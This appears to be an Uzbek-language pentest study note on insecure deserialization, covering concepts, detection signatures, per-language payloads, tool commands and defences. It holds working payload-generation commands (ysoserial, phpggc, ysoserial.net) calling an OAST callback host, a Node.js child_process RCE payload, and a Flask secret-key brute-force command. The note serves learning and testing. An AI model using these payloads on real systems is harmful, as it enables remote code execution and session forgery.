# Insecure Deserialization

> Lab yechimlari (PortSwigger'ning 10 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Serialization = obyektni saqlash/uzatish uchun bayt/matnga aylantirish; deserialization = teskarisi.
Ilova foydalanuvchi boshqaradigan joyda (cookie, hidden field) serialized obyekt saqlasa va uni
**ishonchsiz holda** qayta obyektga aylantirsa, sen: (1) obyekt **holatini** o'zgartirasan
(`isAdmin=1`); yoki (2) ilovada mavjud sinflar ("gadget") zanjirini qurib, deserialization paytida
avtomat chaqiriladigan "magic" metodlar (`__wakeup`, `readObject`, `__destruct`) orqali **kod
ishlatasan** (RCE).

**Ildiz sabab:** ishonchsiz ma'lumotni deserialize qilish — bu aslida "foydalanuvchiga obyekt
yaratish va metod chaqirish" huquqini berish. Magic metodlar esa sen bermagan buyruqni avtomat
bajaradi.

## Turlari
- **Obyekt holatini o'zgartirish** — serialized blobdagi atributni (`admin b:0`→`b:1`) tahrir.
- **Type juggling** — PHP `==` quirkidan foydalanish (string→int).
- **Magic method / mavjud gadget** — `__destruct`/`__wakeup`/`readObject` orqali fayl o'chirish/RCE.
- **Pre-built gadget chain** — ysoserial (Java CommonsCollections), PHPGGC (Symfony), Ruby universal.
- **Custom gadget chain** — ilovaning o'z sinflaridan zanjir qurish.
- **PHAR deserialization** — `phar://` orqali file-operation funksiyasida deserialize.

## Oqibatlar (IMPACT)
- **RCE** — server sen qurgan zanjir orqali kod ishlatadi (eng ko'p yakuni).
- Auth bypass, privilege escalation (holat o'zgartirish).
- Signed cookie forge → ATO; ixtiyoriy fayl o'qish/o'chirish.
> Odatda **Critical** (RCE), holat o'zgartirish High.

## Qayerdan qidiriladi
Cookie/hidden field/parametrdagi serialized blob. Signaturalar: PHP `O:8:`, Java
`rO0AB` (base64) / `\xac\xed\x00\x05`, Python pickle, .NET `AAEAAAD`, Ruby `\x04\x08`,
ViewState (`__VIEWSTATE`).

## Tillar bo'yicha

### PHP
```php
O:4:"User":1:{s:7:"isAdmin";b:1;}        # object injection
# __wakeup bypass (CVE-2016-7124): property sonini oshir
# phar:// deserialization (fayl funksiyasiga phar yo'li)
```

### Java
```
Signatura: AC ED 00 05 (hex) / rO0AB (base64)
Gadget: CommonsCollections1-7, Spring1, Groovy1
URLDNS — blind detect uchun (RCE'siz)
```

### Python (pickle)
```python
# __reduce__ orqali RCE; Flask signed cookie SECRET_KEY topilsa forge
```

### .NET
```
ViewState MAC yo'q / machineKey leak → RCE
```

### Node.js
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

## TOOLLAR

### ysoserial — Java deserialization podshosi
```bash
java -jar ysoserial.jar CommonsCollections5 'curl http://xxx.oast.pro' | base64
```
> Gadget chain bilan RCE payload yasaydi. Blob'ni cookie/parametrga qo'yasan.

```bash
java -jar ysoserial.jar URLDNS "http://xxx.oast.pro"
```
> RCE'siz, faqat DNS callback bilan "deserialization bormi" ni xavfsiz isbotlaysan.

### phpggc — PHP gadget chain yasagich
```bash
phpggc -l
```
> Mavjud gadget chain'larni (Monolog, Laravel, Symfony) ro'yxatlaydi.

```bash
phpggc Monolog/RCE1 system id
```
> `id` ishlatadigan PHP deserialization payload yasaydi.

### ysoserial.net — .NET uchun
```bash
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "ping xxx.oast.pro"
```
> .NET BinaryFormatter/ViewState uchun RCE payload beradi.

### jwt_tool + flask-unsign — signed cookie forge
```bash
flask-unsign --unsign --cookie "<cookie>" --wordlist rockyou.txt
```
> Flask SECRET_KEY'ni brute qilib topadi — keyin `--sign` bilan istagan session yasaysan.

### Burp "Java Deserialization Scanner" / "Freddy"
```
Burp extension → passiv/aktiv deserialization teshiklarini belgilaydi
```
> Blob'larni avtomat topib, ysoserial bilan test qilishni osonlashtiradi.

## PoC
Blind → `URLDNS`/OAST callback bilan isbot. RCE → `id`/`hostname`.

## Himoya
Ishonchsiz ma'lumotni deserialize qilma, faqat JSON + qat'iy schema, HMAC imzo
(kalit maxfiy), allowlist deserialization, `BinaryFormatter`/`pickle`/`Marshal.load`'dan voz kech.
